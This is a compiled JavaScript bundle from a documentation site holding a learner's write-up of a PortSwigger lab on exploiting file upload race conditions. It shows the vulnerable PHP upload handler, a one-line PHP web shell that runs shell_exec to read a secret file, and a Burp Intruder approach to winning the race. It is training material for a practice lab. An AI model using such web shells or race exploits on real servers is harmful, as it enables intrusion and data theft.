"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[8588],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return f}});var i=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,i,r=function(e,t){if(null==e)return{};var n,i,r={},a=Object.keys(e);for(i=0;i<a.length;i++)n=a[i],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(i=0;i<a.length;i++)n=a[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=i.createContext({}),c=function(e){var t=i.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return i.createElement(s.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},u=i.forwardRef((function(e,t){var n=e.components,r=e.mdxType,a=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),u=c(n),f=r,h=u["".concat(s,".").concat(f)]||u[f]||d[f]||a;return n?i.createElement(h,o(o({ref:t},p),{},{components:n})):i.createElement(h,o({ref:t},p))}));function f(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var a=n.length,o=new Array(a);o[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:r,o[1]=l;for(var c=2;c<a;c++)o[c]=n[c];return i.createElement.apply(null,o)}return i.createElement.apply(null,n)}u.displayName="MDXCreateElement"},4737:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return l},contentTitle:function(){return s},metadata:function(){return c},toc:function(){return p},default:function(){return u}});var i=n(7462),r=n(3366),a=(n(7294),n(3905)),o=["components"],l={},s=void 0,c={unversionedId:"portswigger/File-upload/Lab-7 Race-conditions",id:"portswigger/File-upload/Lab-7 Race-conditions",title:"Lab-7 Race-conditions",description:"Exploiting file upload race conditions",source:"@site/docs/portswigger/File-upload/Lab-7 Race-conditions.md",sourceDirName:"portswigger/File-upload",slug:"/portswigger/File-upload/Lab-7 Race-conditions",permalink:"/Cybernotes/docs/portswigger/File-upload/Lab-7 Race-conditions",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab-6 Flawed-validation",permalink:"/Cybernotes/docs/portswigger/File-upload/Lab-6 Flawed-validation"},next:{title:"Lab-1 Error messages",permalink:"/Cybernotes/docs/portswigger/Information-disclosure/Lab-1 Error messages"}},p=[{value:"Exploiting file upload race conditions",id:"exploiting-file-upload-race-conditions",children:[],level:2},{value:"Challenge",id:"challenge",children:[],level:2}],d={toc:p};function u(e){var t=e.components,l=(0,r.Z)(e,o);return(0,a.kt)("wrapper",(0,i.Z)({},d,l,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"exploiting-file-upload-race-conditions"},"Exploiting file upload race conditions"),(0,a.kt)("p",null,"Modern frameworks are more battle-hardened against these kinds of attacks. They generally don't upload files directly to their intended destination on the filesystem. Instead, they take precautions like uploading to a temporary, sandboxed directory first and randomizing the name to avoid overwriting existing files. They then perform validation on this temporary file and only transfer it to its destination once it is deemed safe to do so."),(0,a.kt)("p",null,"That said, developers sometimes implement their own processing of file uploads independently of any framework. Not only is this fairly complex to do well, it can also introduce dangerous race conditions that enable an attacker to completely bypass even the most robust validation."),(0,a.kt)("p",null,"For example, some websites upload the file directly to the main filesystem and then remove it again if it doesn't pass validation. This kind of behavior is typical in websites that rely on anti-virus software and the like to check for malware. This may only take a few milliseconds, but for the short time that the file exists on the server, the attacker can potentially still execute it."),(0,a.kt)("p",null,"These vulnerabilities are often extremely subtle, making them difficult to detect during blackbox testing unless you can find a way to leak the relevant source code."),(0,a.kt)("h2",{id:"challenge"},"Challenge"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"This lab contains a vulnerable image upload function. Although it performs robust validation on any files that are uploaded, it is possible to bypass this validation entirely by exploiting a race condition in the way it processes them.\nTo solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file ",(0,a.kt)("inlineCode",{parentName:"p"},"/home/carlos/secret"),". Submit this secret using the button provided in the lab banner.\nYou can log in to your own account using the following credentials: ",(0,a.kt)("inlineCode",{parentName:"p"},"wiener:peter"))),(0,a.kt)("p",null,"--\x3e In this lab the backend code is looks like this :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},'`<?php\n$target_dir = "avatars/";\n$target_file = $target_dir . $_FILES["avatar"]["name"];\n\n// temporary move\nmove_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);\n\nif (checkViruses($target_file) && checkFileType($target_file)) {\n\xa0\xa0\xa0\xa0echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";\n} else {\n\xa0\xa0\xa0\xa0unlink($target_file);\n\xa0\xa0\xa0\xa0echo "Sorry, there was an error uploading your file.";\n\xa0\xa0\xa0\xa0http_response_code(403);\n}\n\nfunction checkViruses($fileName) {\n\xa0\xa0\xa0\xa0// checking for viruses\n\xa0\xa0\xa0\xa0...\n}\n\nfunction checkFileType($fileName) {\n\xa0\xa0\xa0\xa0$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));\n\xa0\xa0\xa0\xa0if($imageFileType != "jpg" && $imageFileType != "png") {\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0echo "Sorry, only JPG & PNG files are allowed\\n";\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0return false;\n\xa0\xa0\xa0\xa0} else {\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0return true;\n\xa0\xa0\xa0\xa0}\n}\n?>\n')),(0,a.kt)("p",null,"--\x3e This website is checking the file for viruses after upload so if we upload the file continuesly and then keep refresh the page then we can see the content of the file and it's called ",(0,a.kt)("inlineCode",{parentName:"p"},"race condition")),(0,a.kt)("p",null,"--\x3e So i made one basic payload and injected it :"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-php"},"<?php echo shell_exec('cat /home/carlos/secret'); ?>\n")),(0,a.kt)("p",null,"--\x3e after that i forwarded that request to intruder and then brute forced the ",(0,a.kt)("inlineCode",{parentName:"p"},"user-agent")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(6770).Z,width:"1287",height:"651"})),(0,a.kt)("p",null,"--\x3e I brute forced using the number"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(4342).Z,width:"1207",height:"669"})),(0,a.kt)("p",null,"--\x3e Durint the brute force we can goto ",(0,a.kt)("inlineCode",{parentName:"p"},"/files/avatars/webshell.php")," and refresh the page and get the flag!"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(9359).Z,width:"1311",height:"187"})),(0,a.kt)("p",null,"--\x3e And i we solved the lab!"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(8136).Z,width:"1541",height:"273"})))}u.isMDXComponent=!0},4342:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220125133903-0b6905be38a72e9d0dce1b1b900c6a08.png"},8136:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220125134214-2a28076194cae755b484977ce7f5e567.png"},9359:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220125134232-b3030e0212ff24565c32419663749b94.png"},6770:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220125142120-618f78ddfb493d35b17812217e4fd1c5.png"}}]);